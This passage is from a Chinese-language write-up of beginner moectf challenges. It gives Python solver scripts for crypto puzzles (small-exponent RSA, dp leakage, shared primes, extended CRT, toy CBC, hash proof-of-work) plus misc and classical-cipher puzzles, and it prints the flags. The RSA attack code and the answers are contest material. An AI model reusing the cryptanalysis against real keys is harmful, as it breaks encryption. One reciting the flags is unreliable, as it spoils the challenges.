print("e1=" + str(e1))
print("c1=" + str(c1))
print("n2=" + str(n2))
print("e2=" + str(e2))
print("c2=" + str(c2))
print("dp2=" + str(dp2))

'''
n1=133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707
e1=3
c1=1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n2=159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
e2=65537
c2=37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306
dp2=947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
'''
 
```

第一部分(试出来的,觉得开三次方根算的比较快,就想着试一试,结果直接出了)

```python
from Crypto.Util.number import*
import gmpy2
n = 133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707
e = 3
c = 1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
for k in range(10):
    m = gmpy2.iroot(c+k*n, 3)[0]
    print(long_to_bytes(m))
```

第二部分

dp泄露:

dp≡d mod(p-1) => dp×e≡d×e mod(p−1) => d×e≡k×(p−1)+dp×e (1)
又有 d×e≡1modϕ(n) (2)

所以k×(p−1)+dp×e≡1modϕ(n) => k1×(p−1)+dp×e=k2×(p−1)×(q−1)+1

=> dp×e=[k2×(p−1)×(q−1)+1]-k1×(p−1)

=> dp×e=[k2×(p−1)-k1]×(p−1)+1

设X= k2×(p−1)-k1 => dp×e=X×(p−1)+1

由dp≡d mod(p-1)又可以得知dp<(p-1) => $$X =  \frac{dp}{p-1} \times {e}-{p+1} < e$$

所以遍历X最多有65537种可能,根据 $${p-1}=\frac{({e} \times {dp})-1}{X}$$ 求出(p−1),得到p看是否能被n整除

p找到后接下来就是常规RSA的解法

```python
from Crypto.Util.number import*
import gmpy2
n = 159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
e = 65537
c = 37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306
dp = 947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
for x in range(1, e):
    if(e*dp % x == 1):  # 筛选x使得(p-1)是整数
        p = (e*dp-1)//x+1  # 计算p
        if(n % p != 0):  # 计算p是否是n的因子
            continue
        q = n//p  # 计算q
        phin = (p-1)*(q-1)
        d = gmpy2.invert(e, phin)
        m = pow(c, d, n)
        flag = long_to_bytes(m)
        print(flag)
```

> moectf{T8uus_23jkjw_asr_3d32awd!5f&#@sd}

### EZfator

> 描述:偷懒是危险的～ 题目地址： nc polarnova.top 10001
>
> hint:
>
> 1. "nc" for netcat
> 2. 如何高效的判定素数

Task类里重要的有`Goldbach_proof_of_work函数`和`handle函数`

`Goldbach_proof_of_work函数`随机给出一个大数,让你分解成两个质数的和,我是先做的moe2022_一次就好,参考了RSA因子大小相近时分解因子的方法,因为A+B=bigeven,而且A>=B,所以A一定大于bigeven/2,不停的next_prime直到A和B都是素数就行,脚本如下:

```python
from Crypto.Util.number import isPrime
import gmpy2
bigeven = input("input the bigeven : ")
tmp = int(bigeven)//2
A = gmpy2.next_prime(tmp)
while(A < int(bigeven)):
    B = int(bigeven)-A
    if isPrime(B):
        break
    else:
        A = gmpy2.next_prime(A)
print("A=", A)
print("B=", B)
```

`handle函数`在`Goldbach_proof_of_work函数`返回True后会随机生成一个Q,再用相同的P对flag进行加密

利用上述的脚本获得两组N,取公因数就能得到不变的P,之后就是常规RSA

```python
from Crypto.Util.number import*
import gmpy2
import math

m = 0x42e36b6fe93cb6b43898023d3004a9b6ccdfc73f6bd85f9995e9a686a0965ec35597ff371a9e77ca12dafc361670ab5b772699b20fe9922ca95af6a673b8b03de20979c0a186e44fea0286a06655ceb1ec29fea5b8f0b9f1f2ea0168fed340272833b8a1fd02bc7d519bba9230bb36411628a692de960a5abf988754c39bccfcb36b4e1d2a6e580d058de2bcda2c6cca5a02d47fbec5e6bdf604aa4fa319b5d92f851d769c283d67afd48723fe9d634bca0453ff4f5d691fd48fd68a54a711a4ec7d720b26f15f729b8a0ba28982f38d590c666a67852b63753d13f57d48f03b13ddd0db9bad297eee0953220e84fb9e201231ed7fad9ab3400f1868488a103255e1fa2c244ab253314eb79d2f02b523f07e916c16ff65c7ef32cb03fa2ab0e7aee69785373c1c7ef64cdb311da5feeadb7129ad9e1ae64c8a680d47e0faba96e7e878397c9536d2ada139383f21cd6f52b724b10adefda2e888ee3e33f7e92348ae641512f61a2c526c37a5fd5b31864ef8255003d097936d0da49c269013d4b44a7fd40a65c986a57669ed75931a722cb3e9d571844595b7862d536e1dfa6e4e633a2486252a0949fa909425d7c26c65aa60a6e8b44536360c977889db677371ab9581c7848c4e542bf927b67c82df0847a44a4cbe35cea19bfb7e44070b0f0a4317720e63e43b46df69a9d148eb20eaf5673c106d99617abf4cf385dcdcff
N = 0x78f77009d940ea0bd848e177c565cb2a0736c987478661dcf0e8a5f03c219ad9b723d33c1b81bd34e9929de85a04155807f3fce8bea2a9044c4e1ac6cb218972a877432059e1c910f843edc651928c70ee6ebcecb36d833738ba5134c8bfa7eabca853c350e57b8bab48cddaa8f899aaa026ca4985638ce0738766d780db1d70fb35788496ab72dad1492c4f89134c400e4de3e476dd770c1011afb45a791ca719c2075bdf243c1d3abc357f7f9b2579c58ec0e0f312643e9e4bef6bfdaa65d2f2d48a28670fdbc3b471858bb2282fd5c24aff70bf0a805e6f40c8fd432148e632433a5666934759afb6066c4c6a9d43b07cfe1ed00d99727f61b56a650bd2f4c97822d1acb13dbbe2fc58dd8c6d44d1067a346ee4b22dc3f21a993ee3ee377da33fa34e390f1ac9b9c8370fb293e12f02b08a90c55bcd9beeb04099f197479cac142fbb7c6d30808839d9aeef17a510673dd544e1675fe8d5e6bebb0763d4d24d2aab58648072e676136610e8e465058a8edc55e9e18991906ede282a18be0b4574e7c1ade1fb28cf5e02983e7edca399af933ed51dacd33982f49da13773694fe05d759de5d3c8570ccd081fe512efd84d40fdfd77c800ac1fca3d091c7577b420b349ee6ae5ec8be4317c742b1a299588021a8d7ece0145c2b1ceb782ef0300dcd1adc1cfded61d4014c96fdf95d6af879e20d77e30cda53d08b3ebd5ca6f

N2 = 0x6edf030fb32b56af2ecc11bb4e7a40f2c9fd3369a4f9dc9bed3b4b2c162bec4db734da4912ee4ea99d991e9ace6f42ea80554d975fd0b7841e4b962e6aab936209a503f4a63845dddf65b360af61dd99802efa9b425360d9d9100c09403a919a703d6a2274c63b84d8c83ba5bb1197a82d7018023b75ecb2a3e0d390cb22ea79e36b1f3765ff662ff0343f6331613c651f38f540347ab0615514854e07308bfc29edad4fbbdf40a51c996cb25fabc42b938f00ccbba8b4596990471c8ba4ac12613c51ba792adf0014de4297875ce387fb5b88addbf834052b0c87a18d13eb8f10373096988ec842c0516bcf2f54da4fc6cb9a039a65a4727bbd64f75ee45ae360593d37947350ec1e85d348ec0773198f2fad755b3819cc87a248e85d52cad682c378ef253bbac5f975e5ba96e1f1c798c8e3b40a2307de1add43c8e1e536d4c699fe7c6d10f7b80b0854fe9ceff8bfc9fa637b4a9228e21e375975f16b39ce62e47d9dd8aa03ac1ed7867b26c4714ea6e4a41607fec6882e7453e5ae7ce5a5c6197ea17522b5f12acd805ab52e6fc96ed6a7ee95c0a7203035201fde54cf05930838a9228a16c7afc9109ac4ed28685b4f1352e24b7e8e4a2c0fcb93404715e24493bb0e3523685b9186eebd1db6e9bb6786799776e0d6a1ca4a2d0399eb658e05197829417c5bad0534dc6584dadbefca92ff6459d523081e2173954aea05
e = 65537
p = math.gcd(N, N2)
q = N//p
phi = (p-1)*(q-1)
d = gmpy2.invert(e, phi)
c = pow(m, d, N)
flag = long_to_bytes(c)
print(flag)
```

> moectf{1t5_d4nger0us_t0_u5e_the_same_P_repeated1y}

### Weird_E_Revenge

> 描述:“你为什么执迷不悟？”

[扩展中国剩余定理 - 阮行止 的博客 - 洛谷博客 (luogu.com.cn)](https://www.luogu.com.cn/blog/blue/kuo-zhan-zhong-guo-sheng-yu-ding-li) 

给了模不互素的同余方程组,且e和(q-1)不互素,用扩展中国剩余定理解出m^e,m<p\*r,用signin的方法求pow(x,inv(e,(p-1)(r-1),pr)

x≡r1%m1,x≡r2%m2 同余方程组但是m1和m2有最大公因数q,不能用中国剩余定理,需要用扩展中国剩余定理(excrt)，把方程两两合并

- 化成k的不定方程的形式:

x=r1+k1m1=r2+k2m2 => $$k_1m_1-k_2m_2=r_2-r_1$$

r2-r1已知,m1和m2也已知,满足二元一次方程Ax+By=C的形式(A=m1,B=m2,C=r2-r1,x=k1,y=k2)，且当(A,B)|n时方程有解(裴蜀定理)

- exgcd解裴蜀等式,进而得到不定方程的一个解k:

设d=gcd(m1,m2), p1=m1/d, p2=m2/d, 显然p1,p2是互质的。

那么把m1用p1d来代替,m2用p2d来代替,可以把上面的式子写成 $$k_1 p_1 - k_2p_2 = \frac{r_2 - r_1}{d}$$

使用扩展欧几里得算法(exgcd)能算出裴蜀等式Ax+By=gcd(A,B)的一个解

此处能解出$$k_1 p_1 - k_2p_2 = 1$$的解,k1的特解就是x0\*(r2-r1)/d,x就是r1+k1m1,两个方程就能合并为x≡(r1+k1m1)%[m1,m2]

```python
from Crypto.Util.number import *
import gmpy2
import math


def exgcd(a, b):
    if b == 0:
        return 1, 0, a
    else:
        x, y, q = exgcd(b, a % b)
        x, y = y, (x - (a // b) * y)
        return x, y, q


p = 11820891196647569262137841192985418014377132106496147254821784946481523526822939129065042819464351666077658751406165276121125571355594004514547517855730743
q = 10450390015864176713581330969519712299844487112687677452105216477861582967322473997670559995588440097951786576039009337782247912476227937589298529580432797
r = 9484954066160968219229920429258150817546418633451929876581842443665029377287119340232501682142185708534413073877473741393278935479791561681402673403009771
m1 = p*q
m2 = q*r
r1 = 69574855207460025252857869494766338442370688922127811393280455950372371842144946699073877876005649281006116543528211809466226185922844601714337317797534664683681334132261584497953105754257846471069875622054326463757746293958069752489458646460121725019594141157667480846709081917530190233900184428943585065316
r2 = 66183492015178047844987766781469734325646160179923242098082430373061510938987908656007752256556018402101435698352339429316390909525615464024332856855411414576031970267795270882896721069952171988506477519737923165566896609181813523905810373359029413963666924039857159685161563252396502381297700252749204993228
e = 343284449

assert (r2-r1) % math.gcd(m1, m2) == 0  # 通过裴蜀定理判断是否能合并(有解)
d = math.gcd(m1, m2)
p1 = m1//d
p2 = m2//d
x0, y0, q = exgcd(m1, m2)  # 扩展欧几里得解裴蜀等式
k1 = (r2-r1)*x0//d  # 根据裴蜀等式的解得到不定方程的解
x = r1+k1*m1  # 得到解m^e
# phi = (p-1)*(q-1)*(r-1
phi = (p-1)*(r-1) # 求m
d = gmpy2.invert(e, phi)
m = pow(x, d, p*r)
flag = long_to_bytes(m)
print(flag)

```

> moectf{Th1s_iS_Chinese_rEm41nDeR_The0rEm_CRT!}

### ez_cbc

> 描述:这个分组加密（块密码）看起来好简单啊！可是我Key在哪呢？

第一组一定是b'moec',IV已知，能把K算出来

```python
from Crypto.Util.number import *
K = 580598200
b = [748044282, 2053864743, 734492413, 675117672, 1691099828, 1729574447,
     1691102180, 657669994, 1741780405, 842228028, 1909206003, 1797919307]
IV = bytes_to_long(b'cbc!')
c = []
c0 = IV ^ b[0] ^ K
c.append(c0)
for i in range(len(b)-1):
    c.append(b[i] ^ b[i+1] ^ K)
for i in c:
    print(long_to_bytes(i).decode(), end="")
```

> moectf{es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8}

### ez_hash

> 描述:Hash collision is usually not easy. How about this? nc polarnova.top 10002

第一部分让解出sha256的前四位,爆破就行

```python
import hashlib
import itertools
table = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
strlist = itertools.product(table, repeat=4)

sha256 = "fe80bf16e95a21d234e52af242a20b8631e5d6c4e0d38172d789ceb5d9f0bc53"
tail = "v19XR7xL6pcOsaUh"

xxxx = ''

for i in strlist:
    data = i[0]+i[1]+i[2]+i[3]
    data_sha = hashlib.sha256((data+tail).encode()).hexdigest()
    if(data_sha == sha256):
        xxxx = data
        break

print(xxxx)

```

第二部分是自定义的hash,让输入和给定的msg相同哈希的字符串

把字符串填充之后分成a,b,c,d四组，异或顺序无关，乘法顺序无关，不改变d就行，把a，b换一下得到：

`@_string_w1th_thc4n_y0u_g1v3_m3_3_same_h4sh_a5_th1s_m3ss4ge?1f_u_g1ve_m3_i_wi11_giv3_y$u_@_flag!`

> moectf{w0w!U_f1nd_@_c0l1isi0n!U_2_th3_m4ster_of_ARX!}

## MISC

### 指南

### Hide-and-seek

pdf的图片后面有东西,ctrl A全选ctrl C复制就拿到了

> moectf{Hey_U_ve_f0und_m3!}

### Rabbit

winhex打开,图片最后有串这个

`########(=^-^=)###U2FsdGVkX1+EPlLmNvaJK4Pe06nW0eLquWsUpdyv3fjXM2PcDBDKlXeKupnnWlFH
ewFEGmqpGyC1VdX8`

把`U2FsdGVkX1+EPlLmNvaJK4Pe06nW0eLquWsUpdyv3fjXM2PcDBDKlXeKupnnWlFH
ewFEGmqpGyC1VdX8`拿去[Rabbit加解密(ES JSON在线工具)](http://www.esjson.com/rabbitEncrypt.html)解密(一开始用了个别的,一直出错),得到flag

> moectf{We1c0m3_t0_moectf_an7_3n7oy_y0urse1f}

### 寻找黑客的家

> 描述:大黑客Mikato期末结束就迫不及待的回了家，并在朋友圈发出了“这次我最早”的感叹。那么你能从这条朋友圈找到他的位置吗？

搜索背景里的创铭大厦

> moectf{shenzhen_longhua_qingquan}

### Locked bass

base64

> moectf{N0w_th1s_i4_a_b@ss_U_can_u3e_to_pla9}

### What do you recognize me by?

winhex打开，发现文件头是PN1，改成PNG，后缀也加上PNG，就能打开图片,是个二维码,扫一下出flag

> moectf{You_r4c0gnize_%e!}

### 想听点啥？

文件夹里有mscz文件,查了一下是乐谱文件,而且查到了 : “您可以在Windows、macOS和Linux中使用`MuseScore`打开.MSCZ 文件"

下了个MuseScore,乐谱铺面是`MOECTFI1iKE iS THE PASSWORD`

输入`MOECTFI1iKE`解压得到一个py文件和一个txt，内容就是异或一下

```python
a = [2, 0xA, 0x6, 0x17, 0x12, 0x1D, 0x2C, 0x36, 0xF, 0x1A, 0x2B, 0x2C, 0x43, 0x5D,
     0x8, 0x3A, 0x32, 0x2, 0x1D, 0x41, 0x6C, 0x32, 0x18, 0x6, 0x42, 0x52, 0x5C, 0x42]
before = ord('m')
for i in a:
    new = before ^ i
    print(chr(new), end="")
    before = new
```

> moectf{Want_s0me_mor3_mus1c?}

### Hamming

[汉明码（Hamming Code）原理及实现 - PhiliAI - 博客园 (cnblogs.com)](https://www.cnblogs.com/Philip-Tell-Truth/articles/6669854.html)

一开始当成逆向来做了，hhhh,手写了个海明码解码,但是没用,因为实际要让你做的是`海明码纠错`

alice.py做的是海明码编码

传输过程中有噪声,修改了某些位

bob.py接受信息后,通过`hamming_correct`函数根据校验位得到出错的位数,纠错后再海明码解码

没有给出的就是bob.py中的`hamming_correct`函数

```python
def hamming_correct(bitblock):
    wrong = ""
    for t in range(4):
        wrong += str(reduce(lambda x, y: x ^ y, [
            bit for i, bit in enumerate(bitblock) if i & (1 << t)]))
    wrong = wrong[::-1]
    return(int(wrong, 2))
```

> b'Once upon a time, there were 1023 identical bottles, 1022 of which were plain water and one of which was poison. Any creature that drinks the poison will die within a week. Now, with 10 mice and a week, how do you tell which bottle has poison in it? moectf{Oh_Bin4ry_Mag1c_1s_s0o_c0O1!} Great!'

## 古典

### ABCDEFG~

> 描述:字母儿歌你会倒着唱吗？（大写）

```python
a = [18, 24, 26, 13, 8, 18, 13, 20, 26, 15, 11,
     19, 26, 25, 22, 7, 8, 12, 13, 20]
b = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[::-1]
for i in a:
    print(b[i-1], end="")
```

> moectf{ICANSINGALPHABETSONG}

### 小小凯撒

> 描述:好像大小写都有呢。
>
> hint:
>
> 1. 尝试若干次不正确的话，不妨换个思路？关注一下字母表，建议自己写脚本
> 2. 解出flag之后请手动加上moectf{}
> 3. 
>    每个单词首字母大写，其余小写，无分隔

```python
a = "kqEftuEUEftqOADDqoFRxmsOAzsDmFGxmFuAzE"
b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
for i in range(52):
    flag = ""
    for j in a:
        ch = b[(i+b.index(j)) % 52]
        flag += ch
    print(i, flag)
```

偏移14的时候是yEStHISiStHEcORRECTfLAGcONGRATULATIONS

偏移40是YesThisIsTheCorrectFlagCongratulations

根据hint得到flag

> moectf{YesThisIsTheCorrectFlagCongratulations}

### 维吉尼亚

> 描述:维基百科说： 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”（法语：le chiffre indéchiffrable）。  那么聪明的你能够破解嘛？
>
> hint:
>
> 1. flag格式：全部小写，下划线分隔

一开始因为不知道key,不会做

然后找到个在线网站[Vigenere Solver - www.guballa.de](https://www.guballa.de/vigenere-solver)

直接解出来了：

> information security, sometimes shortened to infosec, is the practice of protecting information by mitigating information risks. it is part of information risk management. it typically involves preventing or reducing the probability of unauthorized/inappropriate access to data, or the unlawful use, disclosure, disruption, deletion, corruption, modification, inspection, recording, or devaluation of information. it also involves actions intended to reduce the adverse impacts of such incidents. protected information may take any form, e.g. electronic or physical, tangible (e.g. paperwork) or intangible (e.g. knowledge). information security's primary focus is the balanced protection of the confidentiality, integrity, and availability of data (also known as the cia triad) while maintaining a focus on efficient policy implementation, all without hampering organization productivity. this is largely achieved through a structured risk management process that involves:
>
> 1. identifying information and related assets, plus potential threats, vulnerabilities, and impacts;
> 2. evaluating the risks
> 3. deciding how to address or treat the risks i.e. to avoid, mitigate, share or accept them
> 4. where risk mitigation is required, selecting or designing appropriate security controls and implementing them
> 5. monitoring the activities, making adjustments as necessary to address any issues, changes and improvement opportunities
> 6. i won't tell you that the `flag is moectf attacking the vigenere cipher is interesting`
>    to standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on password, antivirus software, firewall, encryption software, legal liability, security awareness and training, and so forth.

> 根据hint里的flag格式:全部小写，下划线分隔
>
> moectf{attacking_the_vigenere_cipher_is_interesting}
